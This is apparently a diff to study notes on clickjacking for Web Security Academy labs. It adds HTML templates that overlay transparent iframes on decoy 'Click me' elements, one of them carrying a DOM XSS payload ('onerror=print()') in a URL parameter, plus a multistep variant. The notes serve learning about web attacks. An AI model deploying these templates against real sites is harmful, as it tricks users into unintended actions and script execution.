@@ -55,3 +55,54 @@ Main way of protecting against clickjacking attacks is browser extensions or fra
 ```
 <iframe id="victim_website" src="https://victim-website.com" sandbox="allow-forms"></iframe>
 ```
+## Combining clickjacking with DOM XSS
+In such case we can add xss into iframe and force user to execute xss  
+```
+<style>
+	iframe {
+		position:relative;
+		width:$width_value;
+		height: $height_value;
+		opacity: $opacity;
+		z-index: 2;
+	}
+	div {
+		position:absolute;
+		top:$top_value;
+		left:$side_value;
+		z-index: 1;
+	}
+</style>
+<div>Test me</div>
+<iframe
+src="YOUR-LAB-ID.web-security-academy.net/feedback?name=<img src=1 onerror=print()>&email=hacker@attacker-website.com&subject=test&message=test#feedbackResult"></iframe>
+```
+## Multistep clickjacking
+In such case we can use couple of divisions and iframes in order to force victim to perform multiple actions  
+Example:
+```
+<style>
+    #first_iframe {
+        position:relative;
+        width:1000px;
+        height: 1000px;
+        opacity: 0.5;
+        z-index: 2;
+    }
+    #first_div {
+        position:absolute;
+        top:510px;
+        left:80px;
+        z-index: 1;
+    }
+    #second_div {
+        position:absolute;
+        top:300px;
+        left:210px;
+        z-index: 1;
+    }
+</style>
+<div id="first_div">Click me first</div>
+<div id="second_div">Click me next</div>
+<iframe id="first_iframe" src="https://0af000a4043a20148070587b009600af.web-security-academy.net/my-account"></iframe>
+```
